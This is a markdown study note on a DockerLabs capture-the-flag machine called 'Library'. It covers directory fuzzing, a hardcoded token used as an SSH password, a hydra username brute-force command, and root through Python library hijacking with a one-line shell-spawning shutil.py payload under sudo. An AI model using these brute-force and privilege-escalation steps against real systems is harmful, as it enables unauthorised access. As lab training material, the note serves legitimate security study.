---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, gobuster, hydra, ssh]
techniques: [information-gathering, directory-fuzzing, hardcoded-credentials, ssh-bruteforce, sudo-abuse, python-library-hijacking]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[extraviado]]", "[[psycho]]", "[[file]]"]
---

# Library

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/library.md)

Easy two-port box where the default Apache page is camouflage: the real find is a 26-byte `index.php` holding a lone token — which becomes the password while the **username** axis gets fuzzed — and root hides behind a read-only sudo'd script whose *directory* is writable.

## Path

1. **Recon** — `nmap -p- --open -sS --min-rate 5000` → `22` OpenSSH 9.6p1 Ubuntu, `80` Apache 2.4.58 titled **`Apache2 Ubuntu Default Page: It works`** ([[information-gathering]]).
2. **Web enum** — `gobuster dir -x php,html,txt` → `index.php` (200, **26 bytes**), `index.html` (200, 10671 — the default page), `javascript/` (301), `server-status` (403). `/` serves `index.html` (DirectoryIndex order), so the default page hides the real one — fetch what fuzzing finds, not what the root URL shows ([[directory-fuzzing]]).
3. **The token** — `curl http://172.17.0.2/index.php` → `<h1>JIFGHDS87GYDFIGD</h1>`. A lone gibberish string — no username, no label — but a random 14-char token in a web root is a *password* waiting for its user ([[hardcoded-credentials]]).
4. **Foothold — flip the brute-force axis** — instead of one user × `rockyou`, fuzz usernames with the one secret already in hand: `hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -vV -F -t 16` → **`carlos:JIFGHDS87GYDFIGD`** → `ssh carlos@172.17.0.2` ([[ssh-bruteforce]]).
5. **Privesc enum** — `sudo -l` → `(ALL) NOPASSWD: /usr/bin/python3 /opt/script.py`. The script only copies itself to `/tmp/script_backup.py` via `shutil.copy` — no arguments, no user input ([[sudo-abuse]]).
6. **Root — the directory, not the file** — `ls -la /opt`: `script.py` is `-r-xr--r-- carlos root`, but `/opt` itself is `drwxr-xr-x carlos root`. The script's first import is `shutil`, and Python resolves `sys.path[0]` (the script's own directory) **before** the standard library → drop `/opt/shutil.py` containing `import os; os.execl("/bin/sh", "sh")` → `sudo /usr/bin/python3 /opt/script.py` → `whoami` = `root` ([[python-library-hijacking]]).

## Credentials / secrets

| Item | Value | Where |
|------|-------|-------|
| carlos | `JIFGHDS87GYDFIGD` | `index.php` — lone token; username found by fuzzing |
| root | *no password* | import shadow via `/opt/shutil.py` under pinned sudo python3 |

## Takeaways

- **A default page is camouflage, not absence.** The `<title>` advertised "It works" — the finding was the *other* `200` in the same fuzz run, 26 bytes long. The smallest `200` in a result set deserves a `curl` before the largest ([[directory-fuzzing]]).
- **Brute-force has two axes; fuzz the one you don't know.** Secrets found in the wild arrive without usernames as often as usernames arrive without secrets — swap `-l`/`-P` for `-L`/`-p` and let the list walk the unknown axis ([[ssh-bruteforce]]).
- **A pinned script with carlos-owned file *and* directory has three doors.** `chmod +w` the carlos-owned script and rewrite it, `rm` it and recreate (directory write beats file mode for unlink), or never touch it at all and shadow its import — [[library]] took the third, and it's the only one that leaves the script byte-for-byte intact ([[python-library-hijacking]], cf. [[psycho]] and [[file]] for the overwrite variants).
- **File mode is a red herring on an import attack.** `-r-xr--r--` reads as "untouchable", but the payload never opens the script for writing — the check that matters is `ls -la` on the *parent directory*, ownership and mode both.
- **`sudo -l` output is a map, not a verdict.** The entry looked inert (a self-copy script with no input) until its `import` line revealed the attack surface.

## Gaps in the writeup

- **`server-status` (403) was found and never revisited** — same class as [[dark]]; the gated path exists but its contents stay unknown.
- **`javascript/` (301) was never followed.**
- **The leap from token to password is asserted, not argued.** The writeup says *"assuming JIFGHDS87GYDFIGD is a password"* without spelling out why that assumption is reasonable (randomness pattern, CTF convention: gibberish in a web root is rarely decoration).
- **`chmod +x /opt/shutil.py` is unnecessary** — imports need read permission, not execute — harmless, but it suggests the author was unsure *why* the shadow works.
- **Only one of the three available doors is shown** — the writeup never notes that carlos owns both the file (could `chmod` it) and the directory (could `rm` it); the import shadow is presented as *the* solution rather than the cleanest one.
